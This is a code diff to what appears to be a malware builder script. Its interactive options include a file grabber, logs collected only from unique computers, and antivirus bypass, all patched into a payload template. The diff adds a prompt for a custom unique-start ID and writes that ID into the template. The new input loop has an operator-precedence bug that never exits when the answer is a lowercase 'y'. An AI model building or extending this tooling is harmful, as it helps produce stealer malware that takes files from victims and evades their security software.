@@ -64,6 +64,7 @@ class Builder():
         self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
 
     def Options(self):
+
         self.fileGrab = ""
         while self.fileGrab != "Y" and self.fileGrab != "N" and self.fileGrab != "n" and self.fileGrab != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
@@ -73,6 +74,11 @@ class Builder():
         while self.oneStart != "Y" and self.oneStart != "N" and self.oneStart != "n" and self.oneStart != "y":
             print("\033[36m\033[4m{}\033[0m".format("(?) Enable this if you want logs to come only from unique computers [y/n]"))
             self.oneStart = input("\033[33m\033[1m{}\033[0m".format(">>> "))
+        
+        self.startId = -1
+        while self.startId < 0 and self.oneStart == "Y" or self.oneStart == "y":
+            print("\033[36m\033[4m{}\033[0m".format("(?) unique id for oneStart, \"0\" for default(only numbers)"))
+            self.startId = int(input("\033[33m\033[1m{}\033[0m".format(">>> ")))
 
         self.avBypass = ""
         while self.avBypass != "Y" and self.avBypass != "N" and self.avBypass != "n" and self.avBypass != "y":
@@ -131,6 +137,8 @@ class Builder():
 
         if self.oneStart == "Y" or self.oneStart == "y":
             data = data.replace('oneStart = False', 'oneStart = True')
+            if self.startId > 0:
+                data = data.replace('id = 19380887093145377305', f'id = {str(self.startId)}')
         
         if self.debuging == "Y" or self.debuging == "y":
             data = data.replace('debuging = False', 'debuging = True')
